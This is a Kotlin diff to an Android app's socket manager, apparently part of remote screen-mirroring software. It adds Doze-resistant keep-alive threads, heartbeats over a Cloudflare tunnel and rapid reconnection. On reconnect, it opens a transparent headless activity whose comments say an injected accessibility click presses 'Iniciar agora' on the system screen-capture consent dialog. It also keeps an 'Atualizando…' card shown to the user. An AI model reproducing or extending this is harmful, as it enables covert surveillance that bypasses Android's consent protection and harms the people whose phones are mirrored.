@@ -11,7 +11,9 @@ import android.net.NetworkCapabilities
 import android.net.NetworkRequest
 import android.os.Build
 import android.os.Handler
+import android.os.HandlerThread
 import android.os.Looper
+import android.os.Process
 import android.os.PowerManager
 import android.util.Log
 import androidx.core.app.NotificationCompat
@@ -106,20 +108,18 @@ object SocketManager {
             emitLog("[OVERLAY ERRO] Falha no overlay via Acessibilidade: ${e.message}")
         }
         try {
+            // OVERLAY REMOVIDO DA CAPTURA (Opção A): o OverlayService desenha um
+            // fundo FULL-SCREEN que o MediaProjection CAPTURA — cobria/piscava o
+            // espelhamento no modo desbloqueado. NÃO iniciamos mais ele; apenas
+            // garantimos que fique PARADO. O cartão "Atualizando…" continua pelo
+            // caminho da ACESSIBILIDADE (mostrarOverlayAtualizacao, acima), que
+            // NÃO entra na captura. O clarear/escurecer "Fundo do Dispositivo"
+            // deixa de interferir no vídeo em QUALQUER versão do Android.
             val serviceIntent = Intent(ctx, OverlayService::class.java)
-            if (ativo) {
-                ctx.startService(serviceIntent)
-                emitLog("[OVERLAY] OverlayService iniciado (startService comum, sem foreground — sem risco de ANR/crash).")
-            } else {
-                ctx.stopService(serviceIntent)
-                emitLog("[OVERLAY] OverlayService parado.")
-            }
+            ctx.stopService(serviceIntent)
         } catch (e: Exception) {
-            // BackgroundServiceStartNotAllowedException / IllegalStateException
-            // (app em background sem FGS) — apenas registra, NÃO derruba o app
-            // nem interrompe o espelhamento.
-            emitLog("[OVERLAY ERRO] Não foi possível (des)ativar OverlayService: ${e.message} — o espelhamento continua ativo.")
-            Log.e(TAG, "Erro ao controlar OverlayService: ${e.message}", e)
+            emitLog("[OVERLAY] stopService OverlayService: ${e.message} — espelhamento segue ativo.")
+            Log.e(TAG, "Erro ao parar OverlayService: ${e.message}", e)
         }
     }
 
@@ -226,6 +226,10 @@ object SocketManager {
     @Volatile private var monitorRedeAtivo = false
     private var handlerKeepAliveConexao: Handler? = null
     private var keepAliveConexaoRunnable: Runnable? = null
+    // (B) Thread DEDICADA (fora da Main) para o heartbeat/keep-alive: no Doze da
+    // Samsung a main looper adia postDelayed p/ janelas de manutenção; um
+    // HandlerThread próprio de alta prioridade dispara os 20s mesmo em repouso.
+    private var threadKeepAlive: HandlerThread? = null
 
     /** MANTÉM O CELULAR SEMPRE ONLINE (não perde o espelhamento ao apagar a tela
      *  / Doze / trocar de rede): (1) reconecta ASSIM QUE a internet volta via
@@ -252,13 +256,32 @@ object SocketManager {
         } catch (e: Exception) {
             Log.e(TAG, "Falha ao registrar monitor de rede: ${e.message}")
         }
-        // 2) Keep-alive de conexão a cada 20s (reconecta se caiu; mantém o
-        //    celular listado em "online" mesmo com a tela apagada / em Doze).
-        val h = Handler(Looper.getMainLooper())
+        // 2) Keep-alive + HEARTBEAT ATIVO a cada 20s (mantém o celular "online"
+        //    mesmo com a tela apagada / em Doze). Roda numa THREAD DEDICADA de
+        //    alta prioridade (B) — a main looper congela no Doze da Samsung.
+        val h = try {
+            val t = HandlerThread("AM-KeepAlive", Process.THREAD_PRIORITY_FOREGROUND)
+            t.start()
+            threadKeepAlive = t
+            Handler(t.looper)
+        } catch (e: Exception) {
+            // Fallback seguro: se a thread dedicada falhar, usa a main looper.
+            Log.e(TAG, "Falha ao criar HandlerThread keep-alive, usando main: ${e.message}")
+            Handler(Looper.getMainLooper())
+        }
         handlerKeepAliveConexao = h
         keepAliveConexaoRunnable = object : Runnable {
             override fun run() {
                 try { garantirConexao() } catch (_: Exception) {}
+                // (A) HEARTBEAT ATIVO: mesmo com o socket conectado, emite um
+                //     pacote leve p/ gerar tráfego constante no WebSocket e
+                //     impedir o Cloudflare Tunnel de cortar por ociosidade (~100s).
+                try {
+                    val s = socket
+                    if (s != null && s.connected()) {
+                        s.emit("heartbeat", nomeDispositivoAtual())
+                    }
+                } catch (_: Exception) {}
                 h.postDelayed(this, 20000L)
             }
         }
@@ -311,6 +334,9 @@ object SocketManager {
                     reconnection = true
                     reconnectionAttempts = Int.MAX_VALUE
                     reconnectionDelay = 1000
+                    // (E) Teto curto: se Wi-Fi/4G cair e voltar, a reconexão
+                    //     acontece em segundos (nunca espera backoff longo).
+                    reconnectionDelayMax = 5000
                 }
 
                 val s = IO.socket(serverUrl, opts).apply {
@@ -355,11 +381,26 @@ object SocketManager {
                         // consentimento para restabelecê-lo. Não dispara na 1ª conexão.
                         val ehReconexao = jaConectouUmaVez
                         jaConectouUmaVez = true
-                        if (ehReconexao && !ScreenCaptureService.isRunning) {
+                        // (item 2) SÓ revalida o espelhamento se ele ESTAVA ATIVO antes
+                        // da queda (houve sessão real). Em reconexão ociosa — socket
+                        // volta mas nunca houve espelhamento — NÃO reabre o modal
+                        // (evita o loop do consentimento).
+                        if (ehReconexao && !ScreenCaptureService.isRunning
+                            && ScreenCaptureService.espelhamentoJaAtivou
+                            && !ScreenCaptureService.revalidacaoConsentimentoPendente) {
                             try {
                                 val ctx = appContext ?: MyAccessibilityService.instance
                                 if (ctx != null) {
+                                    // Disparo único (anti-loop): marca pendente para
+                                    // não reabrir o modal em reconexões seguidas.
+                                    ScreenCaptureService.revalidacaoConsentimentoPendente = true
                                     val intent = Intent(ctx, MainActivity::class.java).apply {
+                                        // Igual ao desbloqueio: caminho HEADLESS (janela
+                                        // transparente) → modal de consentimento do SISTEMA
+                                        // sobre a tela inicial, sem abrir o app. Inject clica
+                                        // "Iniciar agora", o modal some e o espelhamento
+                                        // continua por Socket.IO + HTTP.
+                                        putExtra("AUTO_BOOT_REANIMAR", true)
                                         putExtra(MainActivity.EXTRA_REVALIDAR_ESPELHAMENTO, true)
                                         addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
                                     }
